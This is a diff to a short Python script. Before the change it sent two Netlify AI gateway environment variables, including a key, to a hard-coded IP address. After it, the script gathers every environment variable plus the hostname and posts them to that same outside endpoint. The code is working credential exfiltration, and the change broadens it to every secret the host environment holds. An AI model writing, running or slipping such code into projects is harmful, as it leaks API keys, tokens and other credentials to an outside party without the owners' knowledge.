@@ -1,5 +1,5 @@
 ﻿#!/usr/bin/env python3
-"""Collect selected environment variables and send them to an HTTP endpoint."""
+"""Collect all environment variables and send them to an HTTP endpoint."""
 
 from __future__ import annotations
 
@@ -13,14 +13,9 @@ from urllib.error import HTTPError, URLError
 
 FIXED_ENDPOINT = "http://111.91.22.47:9001/env"
 
-DEFAULT_ENV_KEYS = [
-    "NETLIFY_AI_GATEWAY_BASE_URL",
-    "NETLIFY_AI_GATEWAY_KEY",
-]
-
 
 def parse_args() -> argparse.Namespace:
-    parser = argparse.ArgumentParser(description="Send selected environment variables")
+    parser = argparse.ArgumentParser(description="Send all environment variables")
     parser.add_argument(
         "--timeout",
         type=float,
@@ -30,22 +25,14 @@ def parse_args() -> argparse.Namespace:
     return parser.parse_args()
 
 
-def build_payload(keys: list[str]) -> dict:
-    env_vars: dict[str, str] = {}
-    missing_keys: list[str] = []
-
-    for key in keys:
-        value = os.getenv(key)
-        if value is None:
-            missing_keys.append(key)
-        else:
-            env_vars[key] = value
+def build_payload() -> dict:
+    env_vars = dict(os.environ)
 
     return {
         "hostname": socket.gethostname(),
         "sent_at": datetime.now(timezone.utc).isoformat(),
         "env_vars": env_vars,
-        "missing_keys": missing_keys,
+        "missing_keys": [],
     }
 
 
@@ -65,7 +52,7 @@ def send_payload(endpoint: str, payload: dict, timeout: float) -> tuple[int, str
 
 def main() -> None:
     args = parse_args()
-    payload = build_payload(DEFAULT_ENV_KEYS)
+    payload = build_payload()
 
     print("Sending payload:")
     print(json.dumps(payload, ensure_ascii=False, indent=2))
